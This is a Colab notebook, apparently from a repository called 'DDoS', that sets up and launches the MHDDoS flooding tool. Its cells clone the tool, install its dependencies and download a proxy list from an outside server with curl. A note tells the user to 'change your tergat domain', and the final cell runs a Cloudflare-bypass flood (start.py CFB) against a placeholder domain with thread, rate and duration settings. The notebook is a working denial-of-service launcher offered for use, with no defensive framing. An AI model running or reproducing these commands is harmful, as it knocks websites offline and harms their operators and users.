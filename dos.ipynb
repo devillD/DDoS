{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!apt -qq update && apt -qq install git -y"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YCY6HUBOJ37u",
        "outputId": "0ac94313-e5a0-4ed5-e44a-f8e9c521a55d"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "41 packages can be upgraded. Run 'apt list --upgradable' to see them.\n",
            "git is already the newest version (1:2.17.1-1ubuntu0.9).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 41 not upgraded.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/MHProDev/MHDDoS.git dos"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dOlXscAmJ82w",
        "outputId": "842a6089-f51d-4528-9073-45b26c31f514"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "fatal: destination path 'dos' already exists and is not an empty directory.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!mv dos/* . && rm -rf dos"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lb0zCETpKue8",
        "outputId": "91d9ee54-41c0-466f-c5dc-46efb0f4e1da"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "mv: cannot stat 'dos/*': No such file or directory\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip3 install --no-cache-dir -r requirements.txt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FnNOQjaCKwoq",
        "outputId": "d3de186d-e470-49d6-a9f4-448a8966822c"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting git+https://github.com/MHProDev/PyRoxy.git (from -r requirements.txt (line 8))\n",
            "  Cloning https://github.com/MHProDev/PyRoxy.git to /tmp/pip-req-build-uw6vsjv9\n",
            "  Running command git clone -q https://github.com/MHProDev/PyRoxy.git /tmp/pip-req-build-uw6vsjv9\n",
            "Collecting cfscrape<=2.1.1\n",
            "  Downloading cfscrape-2.1.1-py3-none-any.whl (12 kB)\n",
            "Requirement already satisfied: certifi<=2021.10.8 in /usr/local/lib/python3.7/dist-packages (from -r requirements.txt (line 2)) (2021.10.8)\n",
            "Collecting dnspython>=2.2.0\n",
            "  Downloading dnspython-2.2.1-py3-none-any.whl (269 kB)\n",
            "\u001b[K     |████████████████████████████████| 269 kB 15.6 MB/s \n",
            "\u001b[?25hCollecting requests==2.27.1\n",
            "  Downloading requests-2.27.1-py2.py3-none-any.whl (63 kB)\n",
            "\u001b[K     |████████████████████████████████| 63 kB 55.1 MB/s \n",
            "\u001b[?25hCollecting impacket==0.9.23\n",
            "  Downloading impacket-0.9.23.tar.gz (4.1 MB)\n",
            "\u001b[K     |████████████████████████████████| 4.1 MB 85.8 MB/s \n",
            "\u001b[?25hCollecting psutil>=5.9.0\n",
            "  Downloading psutil-5.9.0-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (280 kB)\n",
            "\u001b[K     |████████████████████████████████| 280 kB 88.2 MB/s \n",
            "\u001b[?25hCollecting icmplib>=2.1.1\n",
            "  Downloading icmplib-3.0.3-py3-none-any.whl (30 kB)\n",
            "Collecting yarl~=1.7.2\n",
            "  Downloading yarl-1.7.2-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_12_x86_64.manylinux2010_x86_64.whl (271 kB)\n",
            "\u001b[K     |████████████████████████████████| 271 kB 80.1 MB/s \n",
            "\u001b[?25hCollecting maxminddb>=2.2.0\n",
            "  Downloading maxminddb-2.2.0.tar.gz (330 kB)\n",
            "\u001b[K     |████████████████████████████████| 330 kB 74.9 MB/s \n",
            "\u001b[?25hRequirement already satisfied: pysocks>=1.7.1 in /usr/local/lib/python3.7/dist-packages (from PyRoxy==1.0b4->-r requirements.txt (line 8)) (1.7.1)\n",
            "Requirement already satisfied: charset-normalizer~=2.0.0 in /usr/local/lib/python3.7/dist-packages (from requests==2.27.1->-r requirements.txt (line 4)) (2.0.12)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.7/dist-packages (from requests==2.27.1->-r requirements.txt (line 4)) (2.10)\n",
            "Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.7/dist-packages (from requests==2.27.1->-r requirements.txt (line 4)) (1.24.3)\n",
            "Requirement already satisfied: pyasn1>=0.2.3 in /usr/local/lib/python3.7/dist-packages (from impacket==0.9.23->-r requirements.txt (line 5)) (0.4.8)\n",
            "Collecting pycryptodomex\n",
            "  Downloading pycryptodomex-3.14.1-cp35-abi3-manylinux2010_x86_64.whl (2.0 MB)\n",
            "\u001b[K     |████████████████████████████████| 2.0 MB 29.9 MB/s \n",
            "\u001b[?25hCollecting pyOpenSSL>=0.16.2\n",
            "  Downloading pyOpenSSL-22.0.0-py2.py3-none-any.whl (55 kB)\n",
            "\u001b[K     |████████████████████████████████| 55 kB 67.8 MB/s \n",
            "\u001b[?25hRequirement already satisfied: six in /usr/local/lib/python3.7/dist-packages (from impacket==0.9.23->-r requirements.txt (line 5)) (1.15.0)\n",
            "Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5\n",
            "  Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)\n",
            "\u001b[K     |████████████████████████████████| 432 kB 60.3 MB/s \n",
            "\u001b[?25hCollecting ldapdomaindump>=0.9.0\n",
            "  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)\n",
            "Requirement already satisfied: flask>=1.0 in /usr/local/lib/python3.7/dist-packages (from impacket==0.9.23->-r requirements.txt (line 5)) (1.1.4)\n",
            "Requirement already satisfied: future in /usr/local/lib/python3.7/dist-packages (from impacket==0.9.23->-r requirements.txt (line 5)) (0.16.0)\n",
            "Requirement already satisfied: chardet in /usr/local/lib/python3.7/dist-packages (from impacket==0.9.23->-r requirements.txt (line 5)) (3.0.4)\n",
            "Requirement already satisfied: typing-extensions>=3.7.4 in /usr/local/lib/python3.7/dist-packages (from yarl~=1.7.2->-r requirements.txt (line 9)) (3.10.0.2)\n",
            "Collecting multidict>=4.0\n",
            "  Downloading multidict-6.0.2-cp37-cp37m-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (94 kB)\n",
            "\u001b[K     |████████████████████████████████| 94 kB 57.2 MB/s \n",
            "\u001b[?25hRequirement already satisfied: click<8.0,>=5.1 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.9.23->-r requirements.txt (line 5)) (7.1.2)\n",
            "Requirement already satisfied: Werkzeug<2.0,>=0.15 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.9.23->-r requirements.txt (line 5)) (1.0.1)\n",
            "Requirement already satisfied: itsdangerous<2.0,>=0.24 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.9.23->-r requirements.txt (line 5)) (1.1.0)\n",
            "Requirement already satisfied: Jinja2<3.0,>=2.10.1 in /usr/local/lib/python3.7/dist-packages (from flask>=1.0->impacket==0.9.23->-r requirements.txt (line 5)) (2.11.3)\n",
            "Requirement already satisfied: MarkupSafe>=0.23 in /usr/local/lib/python3.7/dist-packages (from Jinja2<3.0,>=2.10.1->flask>=1.0->impacket==0.9.23->-r requirements.txt (line 5)) (2.0.1)\n",
            "Collecting cryptography>=35.0\n",
            "  Downloading cryptography-36.0.1-cp36-abi3-manylinux_2_24_x86_64.whl (3.6 MB)\n",
            "\u001b[K     |████████████████████████████████| 3.6 MB 56.9 MB/s \n",
            "\u001b[?25hRequirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.7/dist-packages (from cryptography>=35.0->pyOpenSSL>=0.16.2->impacket==0.9.23->-r requirements.txt (line 5)) (1.15.0)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.7/dist-packages (from cffi>=1.12->cryptography>=35.0->pyOpenSSL>=0.16.2->impacket==0.9.23->-r requirements.txt (line 5)) (2.21)\n",
            "Building wheels for collected packages: PyRoxy, impacket, maxminddb\n",
            "  Building wheel for PyRoxy (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for PyRoxy: filename=PyRoxy-1.0b4-py3-none-any.whl size=2830011 sha256=3999e0482a83ce94032353b356a99bf0044206e139bbeba8016ac829cbb6b2a4\n",
            "  Stored in directory: /tmp/pip-ephem-wheel-cache-2hma5v8f/wheels/3a/af/9a/40c4385ca8d291dcd364dd3ef98eb935d60ebade0e4b80150a\n",
            "  Building wheel for impacket (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for impacket: filename=impacket-0.9.23-py3-none-any.whl size=1410779 sha256=074f8ffb03eae1fdbf4d2939c09695de14900195360bc4ec44dd73e2f63a9bd9\n",
            "  Stored in directory: /tmp/pip-ephem-wheel-cache-2hma5v8f/wheels/c2/8a/20/f23912545e96004e037f5eed50be8b7b0903a6fe80ca4ba791\n",
            "  Building wheel for maxminddb (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for maxminddb: filename=maxminddb-2.2.0-py2.py3-none-any.whl size=16356 sha256=94c321f6809e26c0b6ccd6fd6815f21d182a22f36b3204f1c3e934bcd040b33f\n",
            "  Stored in directory: /tmp/pip-ephem-wheel-cache-2hma5v8f/wheels/3b/eb/d9/b4407ec5d0ccddce61c8d2f4db72a68a77a04adea2245b98ef\n",
            "Successfully built PyRoxy impacket maxminddb\n",
            "Installing collected packages: multidict, ldap3, dnspython, cryptography, yarl, requests, pyOpenSSL, pycryptodomex, maxminddb, ldapdomaindump, PyRoxy, psutil, impacket, icmplib, cfscrape\n",
            "  Attempting uninstall: requests\n",
            "    Found existing installation: requests 2.23.0\n",
            "    Uninstalling requests-2.23.0:\n",
            "      Successfully uninstalled requests-2.23.0\n",
            "  Attempting uninstall: psutil\n",
            "    Found existing installation: psutil 5.4.8\n",
            "    Uninstalling psutil-5.4.8:\n",
            "      Successfully uninstalled psutil-5.4.8\n",
            "\u001b[31mERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.\n",
            "google-colab 1.0.0 requires requests~=2.23.0, but you have requests 2.27.1 which is incompatible.\n",
            "datascience 0.10.6 requires folium==0.2.1, but you have folium 0.8.3 which is incompatible.\u001b[0m\n",
            "Successfully installed PyRoxy-1.0b4 cfscrape-2.1.1 cryptography-36.0.1 dnspython-2.2.1 icmplib-3.0.3 impacket-0.9.23 ldap3-2.9.1 ldapdomaindump-0.9.3 maxminddb-2.2.0 multidict-6.0.2 psutil-5.9.0 pyOpenSSL-22.0.0 pycryptodomex-3.14.1 requests-2.27.1 yarl-1.7.2\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!curl https://o-abirxox.cloud.okteto.net/proxyA.txt -o proxy.txt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RrC91k1kNcPW",
        "outputId": "d937bc45-1355-43b9-b6af-93195ad4d30d"
      },
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
            "                                 Dload  Upload   Total   Spent    Left  Speed\n",
            "100  406k  100  406k    0     0   500k      0 --:--:-- --:--:-- --:--:--  500k\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "[**README**](https://telegra.ph/DoS-03-12)\n",
        "\n",
        "`Don't forget to change your tergat domain`"
      ],
      "metadata": {
        "id": "Ji4EbcQwTat-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!python3 start.py CFB terget.domain 0 894 proxy.txt 61 1693"
      ],
      "metadata": {
        "id": "zFtrWTutYEHJ"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "Welcome to Colaboratory",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}